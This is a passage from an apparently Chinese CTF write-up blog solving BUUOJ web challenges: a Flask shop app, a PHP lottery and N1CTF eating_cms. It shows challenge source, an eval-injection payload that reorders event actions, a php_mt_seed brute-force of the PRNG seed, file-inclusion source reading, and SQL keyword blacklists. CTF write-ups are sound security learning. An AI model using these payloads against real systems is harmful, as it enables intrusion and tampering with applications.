punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993" loading="lazy"><p>拿去<code>flask_session_cookie_manager</code>解密</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409" loading="lazy"><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>base64再解密得</p><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>分析serve.py</p><p>先找flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407" loading="lazy"><p>发现在get_flag_handler函数里，而条件是<code>session[&#39;num_items&#39;] &gt;= 5</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470" loading="lazy"><p>再跳到buy_handler函数里</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047" loading="lazy"><p>关键逻辑</p><p><strong>num_items数目先增，然后再扣point，如果point不够再把num_items扣回去</strong></p><p>然后就不会了</p><p>开始分析大佬的WP</p><ul><li><p>仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ </p></li><li><p>利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 </p></li><li><p>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 </p></li><li><p>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。</p></li></ul><p>最终payload：</p><pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre><p>不知道编码问题？<code>#</code>必须写成 <code>%23</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007" loading="lazy"><p>拿去解密得</p><img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945" loading="lazy"><p>base64解密得</p><pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre><p>flag即在其中</p><hr><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620" loading="lazy"><p>看源码有个hidden标签，直接去掉得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>php伪随机数爆破</p><p>用php_mt_seed</p><p>扔虚拟机里make</p><img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275" loading="lazy"><p>然后用python脚本转化得到的数据</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244" loading="lazy"><p>然后运行<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p><p>爆破得<code>394409044</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939" loading="lazy"><p>回去跑出完整字符串</p><img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098" loading="lazy"><p><code>SJShX9epREbTBLfdc4Gu</code></p><p>回去提交出flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278" loading="lazy"><hr><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>打开就是登陆界面</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192" loading="lazy"><p>猜想SQL注入，发现过滤引号，暂时放弃这条路</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135" loading="lazy"><p>不给扫目录，盲猜访问<code>register.php</code>，还真有</p><p>注册用户登陆进去</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847" loading="lazy"><p>发现url猫腻，文件包含，利用伪协议读取一下index</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945" loading="lazy"><pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre><p>解密得index.php源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/index.html"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下user.php</p><p><code>user.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下function.php</p><p><code>function.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token 